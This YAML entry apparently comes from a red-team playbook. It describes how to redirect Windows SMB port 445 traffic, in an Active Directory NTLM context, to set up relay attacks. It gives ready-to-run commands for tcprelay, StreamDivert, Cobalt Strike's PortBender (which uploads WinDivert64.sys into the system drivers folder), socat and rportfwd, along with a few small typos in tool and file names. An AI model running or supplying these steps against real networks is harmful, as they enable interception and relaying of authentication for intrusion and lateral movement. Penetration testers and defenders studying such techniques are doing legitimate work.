title: Configure traffic redirection from port 445 (SMB) on Windows
category: 
  - AD:
    - NTLM
tactic: Execution
tags: []

description: How to configure traffic redirection from port 445 (SMB) on Windows. Admin privileges are required.
references:
  - https://github.com/basil00/Divert
  - https://github.com/ffalcinelli/pydivert
  - https://github.com/jellever/StreamDivert
  - https://github.com/i223t/binaries/tree/main/Windows/TCPRelay

steps: 
  - description: Cofigure to relay connections to a different port on the same interface
    options: 
      - tool: tcpleay.py
        usage: python tcprelay.py --src-port 445 --dst-port 8445

      - tool: StreamDivert
        usage: |
          create a config file: config.txt
          tcp < 445 0.0.0.0 -> 10.10.10.101 8445

          StreamDivert.exe config_file.txt -v
      
      - tool: PortBender (CobaltStrike)
        usage: |
          cd C:\Windows\system32\drivers
          upload C:\Tools\PortBender\WinDivert64.sys
          PortBender redirect 445 8445

  - description: Relay connections from the local interface to somewhere else (optional, for some tools)
    options: 
      - tool: socat
        usage: socat.exe TCP-LISTEN:8445,fork,reuseaddr TCP:192.168.0.200:445
        comments: 
      
      - tool: CobaltStrike
        usage: rportfwd 8445 localhost 445

comments:


  